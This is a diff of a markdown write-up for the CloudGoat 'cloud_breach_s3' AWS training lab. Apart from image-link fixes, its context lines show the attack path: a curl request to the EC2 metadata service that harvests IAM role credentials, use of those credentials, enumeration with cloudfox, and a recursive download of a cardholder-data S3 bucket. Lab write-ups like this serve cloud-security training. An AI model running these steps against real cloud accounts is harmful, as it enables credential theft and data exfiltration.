@@ -4,7 +4,7 @@
 
 [CloudGoat Scenario](https://rhinosecuritylabs.com/aws/capital-one-cloud_breach_s3-cloudgoat/)
 
-![[cloud_breach_s3_CloudGoat_Scenario.png]]
+![Scenario](cloud_breach_s3_CloudGoat_Scenario.png)
 
 - Querying EC2 Metadata Service
 
@@ -25,7 +25,7 @@ curl 34.235.170.226/latest/meta-data/iam/security-credentials/cg-banking-WAF-Rol
 }
 ```
 
-![[s3_breach_1.png]]
+![breach_1](s3_breach_1.png)
 
 ```bash
 aws configure --profile s3_breach
@@ -50,9 +50,9 @@ aws sts get-caller-identity --profile s3_breach
 
 - GuardDuty Alerts Description when running `aws sts get-caller-identity` 
 
-![[GuardDuty IAM finding types - Amazon GuardDuty.png]]
+![GuardDuty](GuardDuty_IAM_finding_types_Amazon_GuardDuty.png)
 
-![[GuardDuty IAM finding types - Amazon GuardDuty_2.png]]
+![GuardDuty](GuardDuty_IAM_finding_types_Amazon_GuardDuty_2.png)
 
 - Connect to an instance
 
@@ -66,13 +66,13 @@ aws ssm start-session --tasrget "instance id"
 ./cloudfox aws --profile s3_breach -v2 inventory
 ```
 
-![[s3_breach_2.png]]
+![breach_2](s3_breach_2.png)
 
 ```bash
 ./cloudfox aws --profile s3_breach -v2 buckets
 ```
 
-![[cloud_breach_s3_CloudGoat_Scenario.png]]
+![breach_3](s3_breach_3.png)
 
 ```bash
 aws --profile $profile s3 cp s3://cg-cardholder-data-bucket-cloud-breach-s3-cgida870e58dn2/ ./s3-buckets/cg-cardholder-data-bucket-cloud-breach-s3-cgida870e58dn2 --recursive
